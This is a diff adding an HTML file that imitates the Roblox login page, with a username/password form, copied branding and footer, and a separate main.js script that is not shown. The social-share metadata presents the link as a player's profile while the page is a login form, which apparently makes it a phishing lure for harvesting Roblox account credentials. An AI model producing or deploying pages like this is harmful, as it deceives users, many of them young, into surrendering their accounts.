@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Login to Roblox. Access your account, play games, and connect with friends.">
+    <title>Log in to Roblox</title>
+    <meta property="og:title" content="gocmineplay1's Profile">
+    <meta property="og:description"
+        content="gocmineplay1 is one of the millions creating and exploring the endless possibilities of Roblox. Join gocmineplay1 on Roblox and explore together!">
+    <meta property="og:image" content="https://tr.rbxcdn.com/30day/420/420/AvatarHeadshot/Png/default">
+    <meta property="og:type" content="profile">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="gocmineplay1's Profile">
+    <meta name="twitter:description"
+        content="gocmineplay1 is one of the millions creating and exploring the endless possibilities of Roblox. Join gocmineplay1 on Roblox and explore together!">
+    <meta name="twitter:image" content="https://tr.rbxcdn.com/30day/420/420/AvatarHeadshot/Png/default">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/webp" href="./Assets/WebIcon.webp">
+    <link rel="stylesheet" href="./style.css">
+</head>
+
+<body id="rbx-body" dir="ltr" class="rbx-body dark-theme builder-font">
+    <div id="app">
+        <!-- Tilted Background -->
+        <div class="background-overlay"></div>
+        <div class="background-grid"></div>
+
+        <!-- Navbar -->
+        <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
+            <div class="container-fluid">
+                <div class="rbx-navbar-header">
+                    <div class="navbar-left">
+                        <div class="logo-container">
+                            <img src="./Assets/Logo.png" alt="Roblox" class="logo">
+                        </div>
+                        <div class="nav-links">
+                            <a id="nav-charts-md-link" href="#">Charts</a>
+                            <a id="nav-marketplace-md-link" href="#">Marketplace</a>
+                            <a id="header-develop-md-link" href="#">Create</a>
+                            <a class="robux-menu-btn" href="#">Robux</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="navbar-right">
+                    <div class="search-container">
+                        <input id="navbar-search-input" type="search" placeholder="Search">
+                        <svg class="search-icon" viewBox="0 0 24 24">
+                            <path fill="currentColor"
+                                d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z" />
+                        </svg>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <main class="login-container">
+            <div class="login-box">
+                <h1 class="login-header">Login to Roblox</h1>
+                <form class="login-form">
+                    <div class="form-group">
+                        <input type="text" id="login-username" placeholder="Username / Email / Phone" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="password" id="login-password" placeholder="Password" required>
+                    </div>
+                    <button type="submit" id="login-button" class="btn-login">Log In</button>
+                    <a id="forgot-credentials-link" href="#" class="forgot-link">Forgot Password or Username?</a>
+                    <div class="divider">
+                        <span></span>
+                    </div>
+                    <button type="button" id="otp-login-button" class="btn-alt">Email Me a One-Time Code</button>
+                    <button type="button" id="cross-device-login-button" class="btn-alt">Quick Sign-in</button>
+                </form>
+                <div class="signup-footer">
+                    <span>Don't have an account?</span>
+                    <a href="#">Sign Up</a>
+                </div>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer id="footer-container" class="container-footer main-footer">
+            <div class="footer">
+                <ul class="footer-links">
+                    <li class="footer-link"><a href="#">About Us</a></li>
+                    <li class="footer-link"><a href="#">Jobs</a></li>
+                    <li class="footer-link"><a href="#">Blog</a></li>
+                    <li class="footer-link"><a href="#">Parents</a></li>
+                    <li class="footer-link"><a href="#">Buy Gift Cards</a></li>
+                    <li class="footer-link"><a href="#">Help</a></li>
+                    <li class="footer-link"><a href="#">Terms</a></li>
+                    <li class="footer-link"><a href="#">Accessibility</a></li>
+                    <li class="footer-link"><a href="#">Privacy</a></li>
+                    <li class="footer-link"><a href="#">Your Privacy Choices <span class="privacy-icon">✓</span></a>
+                    </li>
+                    <li class="footer-link"><a href="#">Sitemap</a></li>
+                </ul>
+                <p class="copyright footer-note">
+                    ©2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered
+                    and
+                    unregistered trademarks in the U.S. and other countries.
+                </p>
+            </div>
+        </footer>
+    </div>
+    <script type="module" src="./main.js"></script>
+</body>
+
+</html>
